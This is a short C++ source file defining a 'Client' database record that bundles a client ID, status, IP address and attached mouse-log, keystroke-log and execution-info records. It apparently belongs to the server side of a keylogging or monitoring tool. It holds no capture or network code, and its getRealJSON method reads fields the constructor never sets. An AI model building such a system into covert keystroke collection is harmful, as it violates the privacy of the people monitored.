#include            "Database/Client.hpp"
#include "Database/Mouselog.hpp"
#include "Database/Keylog.hpp"
#include "Database/ExecInfo.hpp"

Client::Client(std::string client_id, bool status) : Bdd("Client", ToDo::create)
{
    this->addObject("client_id", new String(client_id));
    this->addObject("status", new Bool(status));
    this->addObject("ip", new String(""));
    this->addLine(new Mouselog("", "", ""));
    this->addLine(new Keylog("", "", ""));
    this->addLine(new ExecInfo("", ""));
}

boost::property_tree::ptree Client::getRealJSON() const {
  boost::property_tree::ptree node;
  node.put("origin", static_cast<String *>((*this)("origin"))->getData());
  node.put("content", static_cast<String *>((*this)("content"))->getData());
  return node;
}
